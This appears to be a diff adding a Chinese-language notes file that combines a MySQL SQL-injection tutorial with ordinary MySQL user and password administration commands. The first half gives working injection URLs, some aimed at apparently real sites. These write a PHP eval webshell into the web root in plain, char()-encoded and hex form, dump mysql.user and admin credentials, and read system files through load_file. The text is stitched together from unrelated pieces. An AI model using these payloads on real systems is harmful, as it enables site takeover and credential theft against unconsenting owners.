@@ -1,0 +1,198 @@
+into outfile的高级运用!
+
+　　OK.load_file()我们就说那么多了.接下来,我们还有许多的重头戏要来呢!这里,我要说下一个很重要的运用方法,也正是我着重参考剑心几部作品的技术的部分.当我们确定如下几个条件以后:
+
+　　1获得物理路径(into outfile ’物理路径’) 这样才能写对目录
+
+　　2能够使用union (也就是说需要MYSQL3以上的版本)
+
+　　3对方没有对’进行过滤(因为outfile 后面的 ’’ 不可以用其他函数代替转换)
+
+　　4就是MYSQL用户拥有file_priv权限(不然就不能写文件 或者把文件内容读出)
+
+　　5对web目录有写权限MS的系统一般都有权限,但是LINUX通常都是rwxr-xr-x 也就是说组跟其他用户都没有权限写操作.
+
+　　这 里的1,我们一般可以靠数据库出错信息来爆出来,不行的话,也可以通过load_file()来得到.2那是一般都可以的了...3也不多见对’’’过滤 的.4有没有权限,我们前面已经测试过的了.5如果不能备份到网站的路径上来,我们也还有别的办法,譬如到starup,run里面去等等社工的办法.而 且一般多试试上传目录,图片目录,还是大部分都有读写权限的.
+
+　　OK.需要的条件确定了,那怎么用呢?我们分开两部来说用法.
+
+　　用法1:这是中规中矩的用法,大家都知道.就是采用网站有的留言,上传等功能,把你的一句话马弄上去,然后使用
+
+　　http://www.tian6.com/coder.php?id=1 and 1=2 union select 1,load_file( /www/home/html/upload/qingyafengping.jpg),3,4,5,6 into outfile ’/www/home/html/coder.php’/* 你的小马就诞生了.
+
+　　其中/www/home/html/upload/qingyafengping.jpg为你已上传的木马地址.3,4,5,6为假设存在字段,/www/home/html/为假设的WEB路径.
+
+　　用法2,也是重点要说的.上面的方法,局限性还是比较大的,如果网站不给你上传,或者网站过滤上传的内容,那怎么办?不用怕,剑心早在几年前就给我们想到了个好办法.我们只需要直接这么执行URL:
+
+　　http://www.tiany6.com/coder.php?id=1 and 1=2 union select 1,char(这里是你的马的代码,记得转为10进或者16进),3,4,5,6 into outfile ’/www/home/html/coder.php’/* 这样你的小马也诞生了,不需要上传,也不怕他过滤.
+
+　　譬如
+
+　　http://www.tiany6.com/coder.php?id=1 and 1=2 union select 1,char(60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,63,62),3,4,5,6 into outfile ’/www/home/html/coder.php’/*
+
+　　或者
+  and 1=2 union select 1,0x3C3F706870206576616C28245F504F53545B636D645D293F3E,3,4,5,6 into outfile ’/www/home/html/coder.php’/*
+ 
+或者
+
+　　http://www.tiany6.com/coder.php?id=1 and 1=2 union select 1,’<?php eval(_POST[cmd])?>’,3,4,5,6 into outfile ’/www/home/html/coder.php’/*
+
+　　3,4,5,6为假设存在字段,/www/home/html/为假设的WEB路径.
+
+　　基础部分总结:好,基础部分我就讲到这里.等有空了再给大家带来几个实战的检测.当然,那时候简单的问题就会一笔带过的了.或许你要问,为什么我前面要说那么多,或者说上面的内容,其实大家用心,基本上都可以在网上找到相关的内容,为什么我还要在这里说?我给你的答案只有两个.
+--------------------------------------------------------
+%20/*!39999%20and%201=2*/--
+
+%20and%201=2%20union%20select%201,2,3/*%20and%201=1
+
+%20and%201=2%20union%20select%200x5e5e5e6161615e5e5e/*%20and%201=1
+-------------------------------------------------------
+以下部分只有root 权限或者 全局权限才能操作
+
+select user from mysql.user
+
+http://127.0.0.1/sql.php?id=1 and 1=2 union select concat(char(94),char(94),char(94),user,char(94),char(94),char(94)),1,1 from (select * from (select * from mysql.user order by user limit 6,1)t order by user desc)t limit 1-- 查看数据库中有那些用户 
+
+
+http://127.0.0.1/sql.php?id=1 and 1=2 union select concat(char(94),char(94),char(94),password,char(94),char(94),char(94)),1,1 from (select * from (select * from mysql.user order by user limit 6,1) t order by user desc)t limit 1-- 查看对应用户的 密码
+
+
+通过不断修改limit 2,1达到查看所有
+
+http://127.0.0.1/sql.php?id=1 and 1=2 union select concat(char(94),char(94),char(94),password,char(94),char(94),char(94)),1,1 from (select * from (select * from mysql.user order by user limit 2,1) t order by user desc)t limit 1-- 
+
+
+http://127.0.0.1/sql.php?id=1 and 1=2 union select 1,username,password from admin limit 0,10
+http://127.0.0.1/sql.php?id=1 and 1=2 union select 1,username,password from admin limit 1,10
+http://127.0.0.1/sql.php?id=1 and 1=2 union select 1,username,password from admin limit 2,10
+
+
+通过 limit 一条条记录取出来
+
+或者直接用group_concat()函数 一次显示出来
+
+http://127.0.0.1/sql.php?id=1 and 1=2 union select 1,group_concat(username),group_concat(password) from admin 
+
+
+into outfile 的应用 注意路径是 这样的c:/2ww.php
+
+http://127.0.0.1/sql.php?id=1 and 1=2 union select concat(char(60),char(63),char(112),char(104),char(112),char(32),char(101),char(118),char(97),char(108),char(40),char(36),char(95),char(80),char(79),char(83),char(84),char(91),char(99),char(109),char(100),char(93),char(41),char(63),char(62)),1,1 into outfile 'c:/cm14dd.php' 
+
+
+<?php eval($_POST[cmd])?> 的 asc码
+
+char(60),char(63),char(112),char(104),char(112),char(32),char(101),char(118),char(97),char(108),char(40),char(36),char(95),char(80),char(79),char(83),char(84),char(91),char(99),char(109),char(100),char(93),char(41),char(63),char(62) 
+
+http://127.0.0.1/sql.php?id=1 and 1=2 union select 1,'<?php eval($_POST[cmd])?>',3 into outfile 'c:/tt33.txt'
+
+
+load_file 的应用
+
+http://127.0.0.1//sql.php?id=1 and 1=2 union select concat(char(94),char(94),char(94),load_file(0x633a5c626f6f742e696e69),char(94),char(94),char(94)),1,1 --
+
+0x633a5c626f6f742e696e69 是 c:\boot.ini 的 hex编码
+http://127.0.0.1/sql.php?id=1 and 1=2 union select 1,2,load_file('c:/boot.ini')
+
+http://www.nowpc.net/concrete.php?id=5%20and%201=2%20union%20select%201,2,3,4,group_concat(schema_name)%20from%20information_schema.schemata 
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+推荐命令方式的.注意每行后边都跟个 ； 表示一个命令语句结束.
+格式：grant select on 数据库.* to 用户名@登录主机 identified by "密码"
+
+
+例1、增加一个用户test1密码为abc，让他可以在任何主机上登录，并对所有数据库有查询、插入、修改、删除的权限。首先用以root用户连入MYSQL，然后键入以下命令：
+grant select,insert,update,delete on *.* to test1@"%" Identified by "abc";
+
+
+但例1增加的用户是十分危险的，你想如某个人知道test1的密码，那么他就可以在internet上的任何一台电脑上登录你的mysql数据库并对你的数据可以为所欲为了，解决办法见例2。
+
+
+例2、增加一个用户test2密码为abc,让他只可以在localhost上登录，并可以对数据库mydb进行查询、插入、修改、删除的操作（localhost指本地主机，即MYSQL数据库所在的那台主机），这样用户即使用知道test2的密码，他也无法从internet上直接访问数据库，只能通过MYSQL主机上的web页来访问了。
+
+
+grant select,insert,update,delete on mydb.* to test2@localhost identified by "abc";
+如果你不想test2有密码，可以再打一个命令将密码消掉。
+grant select,insert,update,delete on mydb.* to test2@localhost identified by "";
+=======================================================================
+mysql
+设置密码
+
+方法一 
+使用phpmyadmin，这是最简单的了，修改mysql库的user表， 
+不过别忘了使用PASSWORD函数。 
+
+mysql
+设置密码，如何更改默认的root 
+有好几种方法： 
+1. 命令行更改：
+mysqladmin password 新密码
+例如， dos(或者liunx)下mysql的bin目录下,mysqladmin password 123456 
+2. 用MYSQL的grant语句，例如
+GRANT ALL ON *.* TO 'root'@'localhost' IDENTIFIED BY '123456' WITH GRANT OPTION 
+3. SET PASSWORD FOR '用户名'@'主机' = PASSWORD('密码')
+例如设置root密码为123456，SET PASSWORD FOR 'root'@'localhost' = PASSWORD('123456'); 
+4. Update user SET Password=PASSWORD('新密码') Where User='用户名' AND Host = '主机'; 
+例如，Update user SET Password=PASSWORD('123456') Where User='root' AND Host = 'localhost';flush priviliges; 
+
+Update user SET Password=PASSWORD('1234') Where User='root' AND Host = '%';flush priviliges; 
+
+
+
+方法二 
+使用mysqladmin，这是前面声明的一个特例。 
+mysqladmin -u root -p password mypasswd 
+输入这个命令后，需要输入root的原密码，然后root的密码将改为mypasswd。 
+把命令里的root改为你的用户名，你就可以改你自己的密码了。 
+当然如果你的mysqladmin连接不上mysql server，或者你没有办法执行mysqladmin， 
+那么这种方法就是无效的。 
+而且mysqladmin无法把密码清空。 
+
+下面的方法都在mysql提示符下使用，且必须有mysql的root权限： 
+方法三 
+mysql> Insert INTO mysql.user (Host,User,Password) 
+VALUES('%','jeffrey',PASSWORD('biscuit')); 
+mysql> FLUSH PRIVILEGES 
+确切地说这是在增加一个用户，用户名为jeffrey，密码为biscuit。 
+在《mysql中文参考手册》里有这个例子，所以我也就写出来了。 
+注意要使用PASSWORD函数，然后还要使用FLUSH PRIVILEGES。 
+
+方法四 
+和方法三一样，只是使用了REPLACE语句 
+mysql> REPLACE INTO mysql.user (Host,User,Password) 
+VALUES('%','jeffrey',PASSWORD('biscuit')); 
+mysql> FLUSH PRIVILEGES 
+
+方法五 
+使用SET PASSWORD语句， 
+mysql> SET PASSWORD FOR jeffrey@"%" = PASSWORD('biscuit'); 
+你也必须使用PASSWORD()函数， 
+但是不需要使用FLUSH PRIVILEGES。 
+
+
+方法六 
+使用GRANT ... IDENTIFIED BY语句 
+mysql> GRANT USAGE ON *.* TO jeffrey@"%" IDENTIFIED BY 'biscuit'; 
+这里PASSWORD()函数是不必要的，也不需要使用FLUSH PRIVILEGES。 
+
+
+
+
+
+
+
+
+
+
+
